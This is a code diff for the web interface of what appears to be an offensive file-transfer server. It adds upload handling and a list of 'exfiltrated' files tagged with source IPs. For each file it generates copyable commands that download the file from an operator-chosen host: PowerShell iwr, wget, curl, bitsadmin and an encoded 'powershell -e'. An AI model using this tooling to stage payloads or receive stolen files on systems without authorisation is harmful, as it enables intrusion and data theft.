@@ -143,11 +143,12 @@ function encodeToBase64PowerShell(command) {
 }
 
 document.getElementById('uploadForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+
     const fileInput = document.getElementById('fileInput');
     const statusEl = document.getElementById('uploadStatus');
 
     if (!fileInput.files.length) {
-        e.preventDefault();
         statusEl.className = 'upload-status upload-error';
         statusEl.style.display = 'block';
         statusEl.innerHTML = '<i class="fas fa-exclamation-circle"></i> Please select a file first';
@@ -155,11 +156,54 @@ document.getElementById('uploadForm').addEventListener('submit', function(e) {
         setTimeout(() => {
             statusEl.style.display = 'none';
         }, 3000);
-    } else {
-        statusEl.className = 'upload-status upload-success';
-        statusEl.style.display = 'block';
-        statusEl.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Uploading...';
+        return;
     }
+
+    statusEl.className = 'upload-status upload-success';
+    statusEl.style.display = 'block';
+    statusEl.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Uploading...';
+
+    const formData = new FormData();
+    formData.append('file', fileInput.files[0]);
+
+    fetch('/upload', {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.Status === 'File Uploaded successfully') {
+            statusEl.className = 'upload-status upload-success';
+            statusEl.innerHTML = `<i class="fas fa-check-circle"></i> ${data.filename} uploaded successfully`;
+
+            // Reset file input
+            fileInput.value = '';
+            document.getElementById('fileNameDisplay').textContent = 'No file selected';
+
+            // Refresh the uploaded files list
+            refreshUploadedFiles();
+
+            // Hide status after delay
+            setTimeout(() => {
+                statusEl.style.display = 'none';
+            }, 3000);
+        } else {
+            statusEl.className = 'upload-status upload-error';
+            statusEl.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${data.Status}`;
+
+            setTimeout(() => {
+                statusEl.style.display = 'none';
+            }, 3000);
+        }
+    })
+    .catch(error => {
+        statusEl.className = 'upload-status upload-error';
+        statusEl.innerHTML = '<i class="fas fa-exclamation-circle"></i> Upload failed: ' + error;
+
+        setTimeout(() => {
+            statusEl.style.display = 'none';
+        }, 3000);
+    });
 });
 
 const dropArea = document.querySelector('.file-input-container label');
@@ -453,6 +497,94 @@ function refreshTools() {
         })
         .finally(() => {
             refreshButton.classList.remove('refreshing');
+        });
+}
+
+function refreshUploadedFiles() {
+    const container = document.getElementById('uploadedFilesList');
+    if (!container) return;
+
+    fetch('/api/uploaded-files')
+        .then(response => response.json())
+        .then(files => {
+            if (files.length === 0) {
+                container.innerHTML = `
+                    <div class="no-files">
+                        <i class="fas fa-info-circle"></i>
+                        <p>No files have been exfiltrated yet.</p>
+                    </div>
+                `;
+                return;
+            }
+
+            const ipSelector = document.getElementById('ipSelector');
+            const selectedIP = ipSelector ? ipSelector.value : 'localhost';
+            const port = window.location.port || '1234';
+
+            container.innerHTML = files.map(file => {
+                const urlPath = `uploads/${file.name}`;
+                return `
+                <div class="file-item">
+                    <div class="file-header">
+                        <i class="file-icon fas fa-file-alt"></i>
+                        <div class="file-name">${file.name}</div>
+                        <div class="file-info">
+                            <span><i class="fas fa-weight-hanging"></i> ${file.size}</span>
+                            <span><i class="fas fa-clock"></i> ${file.date}</span>
+                            <span class="source-ip"><i class="fas fa-network-wired"></i> ${file.source_ip}</span>
+                        </div>
+                        <a href="http://${selectedIP}:${port}/uploads/${file.name}" class="download-btn" download="${file.name}" title="Download">
+                            <i class="fas fa-download"></i>
+                        </a>
+                        <button class="delete-btn" data-filename="${file.name}" title="Delete file">
+                            <i class="fas fa-trash-alt"></i>
+                        </button>
+                    </div>
+                    <div class="command-tabs">
+                        <div class="cmd-tab active" data-cmd="powershell"><i class="fab fa-windows"></i> PS</div>
+                        <div class="cmd-tab" data-cmd="wget"><i class="fab fa-linux"></i> wget</div>
+                        <div class="cmd-tab" data-cmd="curl"><i class="fab fa-linux"></i> curl</div>
+                        <div class="cmd-tab" data-cmd="bitsadmin"><i class="fab fa-windows"></i> bits</div>
+                        <div class="cmd-tab" data-cmd="base64"><i class="fas fa-lock"></i> B64</div>
+                    </div>
+                    <div class="command-box cmd-content active" data-cmd="powershell">
+                        <div class="command-content"><code>iwr -Uri "http://${selectedIP}:${port}/${urlPath}" -OutFile "${file.name}"</code></div>
+                        <button class="copy-btn" onclick="copyCommand(this)"><i class="fas fa-copy"></i></button>
+                    </div>
+                    <div class="command-box cmd-content" data-cmd="wget">
+                        <div class="command-content"><code>wget -O "${file.name}" "http://${selectedIP}:${port}/${urlPath}"</code></div>
+                        <button class="copy-btn" onclick="copyCommand(this)"><i class="fas fa-copy"></i></button>
+                    </div>
+                    <div class="command-box cmd-content" data-cmd="curl">
+                        <div class="command-content"><code>curl -o "${file.name}" "http://${selectedIP}:${port}/${urlPath}"</code></div>
+                        <button class="copy-btn" onclick="copyCommand(this)"><i class="fas fa-copy"></i></button>
+                    </div>
+                    <div class="command-box cmd-content" data-cmd="bitsadmin">
+                        <div class="command-content"><code>bitsadmin /transfer j /download /priority high "http://${selectedIP}:${port}/${urlPath}" "$PWD\\${file.name}"</code></div>
+                        <button class="copy-btn" onclick="copyCommand(this)"><i class="fas fa-copy"></i></button>
+                    </div>
+                    <div class="command-box cmd-content" data-cmd="base64">
+                        <div class="command-content"><code>powershell -e [generated]</code></div>
+                        <button class="copy-btn" onclick="copyCommand(this)"><i class="fas fa-copy"></i></button>
+                    </div>
+                </div>
+            `}).join('');
+
+            // Re-attach delete button handlers
+            container.querySelectorAll('.delete-btn').forEach(button => {
+                button.addEventListener('click', function() {
+                    const filename = this.getAttribute('data-filename');
+                    showDeleteConfirmation(filename);
+                });
+            });
+
+            // Initialize command tabs for new file items
+            container.querySelectorAll('.file-item').forEach(item => {
+                initCommandTabs(item, 'powershell');
+            });
+        })
+        .catch(error => {
+            console.error('Error refreshing uploaded files:', error);
         });
 }
 
